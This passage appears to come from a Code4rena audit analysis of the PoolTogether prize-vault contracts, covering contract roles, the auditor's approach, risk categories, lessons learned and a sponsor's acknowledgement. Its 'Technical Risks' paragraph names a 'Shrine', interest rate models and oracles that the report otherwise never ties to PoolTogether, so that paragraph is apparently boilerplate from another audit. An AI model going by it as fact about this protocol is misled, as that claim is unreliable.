| `Claimable.sol` | Allows authorized claimer contracts to claim prizes on behalf of winners and lets users set and manage prize hooks for when they win. | Serves as an extension to vault contracts enabling prize claiming features and includes a mechanism for users to attach hooks to their winnings. | It enhances the protocol by adding functionality for automated prize claiming. Ensuring that this contract is well-maintained and secure is necessary to uphold the integrity of the prize claiming process. |
| `HookManager.sol` | Manages user-defined hooks that execute when prizes are won, allowing for additional actions like notifications or interactions with other contracts. | Provides a straightforward mechanism for users to attach and manage hooks to their accounts, which are executed in response to prize-related events. | It adds flexibility and personalization to the protocol by enabling users to define custom behavior for their winnings. It must be managed to ensure that hooks do not introduce vulnerabilities or excessive gas costs. |
| `IVaultHooks.sol` | Defines the interface for vault hooks, detailing the structure and functionality of hooks that can be triggered before and after the prize claiming process. | Specifies the protocol for implementing vault hooks, ensuring standardization and predictability in hook behavior. | It serves as a blueprint for developers to create custom hook implementations, necessitating careful definition and management to ensure compatibility and security. |

### Comprehensive Flow Diagram of the PoolTogether Protocol

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/305).*

## Approach taken while auditing the codebase

When auditing the PoolTogether protocol, I began by thoroughly reviewing the project documentation and existing audit reports. This initial step helped me understand the protocol's intended functionality, architecture, and security considerations from both a theoretical and a practical perspective.

Next, I delved into the smart contract codebase, starting with the core contracts such as `PrizeVault.sol`, `PrizeVaultFactory.sol`, and `TwabERC20.sol`, among others. My focus was to map out the interactions between these contracts and identify critical functionalities like asset deposits, yield generation, prize distribution, and the unique mathematical models used, including TWAB and random number generation.

To ensure a comprehensive audit, I analyzed the smart contracts for common vulnerabilities, such as reentrancy attacks, overflow/underflow issues, and improper access control. Special attention was given to the contracts' integration with external components like the Chainlink VRF and ERC4626 vaults, assessing how these interactions could impact the protocol's security.

I also scrutinized the protocol's handling of rounding errors and yield buffer management. Understanding these aspects was crucial, given their potential impact on prize distribution fairness and the overall "no loss" principle.

Moreover, I reviewed the tests accompanying the smart contracts to assess their coverage and effectiveness in catching edge cases and potential bugs. Wherever possible, I suggested improvements or additional test scenarios to enhance the protocol's robustness.

In summary, my auditing approach was methodical and thorough, combining a deep dive into the smart contracts, rigorous vulnerability assessment. My goal was to ensure the PoolTogether protocol's security, efficiency, and adherence to its innovative savings and prize distribution mechanisms.

### Systemic Risks

Systemic risks in PoolTogether primarily revolve around the dependencies on external protocols and services for yield generation and randomness. The protocol's reliance on external ERC4626 yield vaults and RNG services introduces potential systemic vulnerabilities, including smart contract failures or manipulations in the integrated protocols.

The `yieldVault` from `PrizeVault.sol` represents an external dependency on ERC4626 yield sources. A systemic failure in the yield source could impact the prize vault's ability to generate yield and thereby prizes for users.

### Centralization Risks

Centralization risks stem from the roles and permissions granted to certain addresses within the protocol. For instance, the ability of the admin or owner to adjust yield strategies and fee parameters introduces a central point of control.

**Example Code**:

```solidity
function setYieldFeePercentage(uint32 _yieldFeePercentage) external onlyOwner {...}
function setYieldFeeRecipient(address _yieldFeeRecipient) external onlyOwner {...}
function setLiquidationPair(address _liquidationPair) external onlyOwner {...}
```

These functions in `PrizeVault.sol` allow the owner to modify critical financial parameters, presenting a centralization risk if the owner's address is compromised or if the owner acts maliciously.

### Technical Risks

**Smart Contract Vulnerabilities:** Bugs or logical errors in the smart contracts can lead to loss of funds, unauthorized access, or unintended behavior. Given the complexity of contracts like the Shrine, interest rate models, and oracle interactions, the attack surface is significant.

**Scalability Concerns:** As transaction volumes grow, the platform must scale without compromising performance or security.

### Integration Risks

Integration risks are primarily associated with the protocol's interactions with external DeFi platforms for yield generation and RNG services for random number generation. The protocol's security and functionality are contingent upon the reliability and integrity of these external services. Any changes or failures in the integrated platforms, such as smart contract upgrades, API modifications, or service discontinuations, could disrupt the protocol's operations. Moreover, the evolving landscape of DeFi presents a risk of compatibility issues, where updates in connected protocols could necessitate adjustments in PoolTogether's contracts to maintain seamless functionality and security.

## New insights and learning of project from this audit
During the audit of the PoolTogether project, several key insights and learning opportunities emerged, highlighting the project's innovative approach to decentralized finance and its integration within the Ethereum ecosystem. The audit provided a deep dive into the mechanics of no-loss prize games, the use of yield-generating strategies, and the complexities of smart contract development and security. Below are some of the primary insights and learnings derived from this audit:

1. **No-Loss Prize Game Mechanics**: The concept of no-loss prize games, where users deposit funds that generate yield in DeFi protocols, with the yield being distributed as prizes, is both innovative and complex. Understanding how PoolTogether manages user deposits, generates yield, and allocates prizes required a comprehensive analysis of the interactions between different smart contracts and external DeFi protocols.

2. **Time-Weighted Average Balance (TWAB)**: The use of TWAB for fair and transparent prize distribution is a sophisticated approach to addressing the randomness and fairness in prize allocation. The audit process offered a deeper understanding of how TWAB works, including the mathematical principles underlying its implementation, and its significance in ensuring that the prize allocation process is both random and weighted towards users with longer deposit durations.

3. **Security Implications of External Integrations**: PoolTogether's reliance on external protocols for yield generation and random number generation (RNG) introduces various security considerations. The audit process emphasized the importance of evaluating the security and reliability of these external services, as well as the mechanisms through which PoolTogether interacts with them. This included an assessment of fallback procedures and contingency plans in case of external service failures.

4. **Yield Strategies and Financial Risks**: Analyzing the yield strategies employed by PoolTogether, including the integration with various DeFi yield sources, provided valuable insights into the financial risks and rewards associated with such strategies. The audit examined the mechanisms for optimizing yield generation, managing risks, and the potential impact of market volatility on the protocol's financial health.

The audit of PoolTogether not only highlighted the project's innovative contribution to the DeFi space but also provided a comprehensive learning experience on the technical, security, and financial aspects of building and maintaining a decentralized protocol. These insights are valuable for the ongoing development of PoolTogether, as well as for the broader DeFi community and future projects in the space.

### Time spent

About 4 hours

**[trmid (PoolTogether) acknowledged and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/305#issuecomment-1997899878):**
 > This report is an excellent overview of the core functionalities of the Prize Vault and demonstrates a concise understanding of the intricacies of the protocol and its core value and risks.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
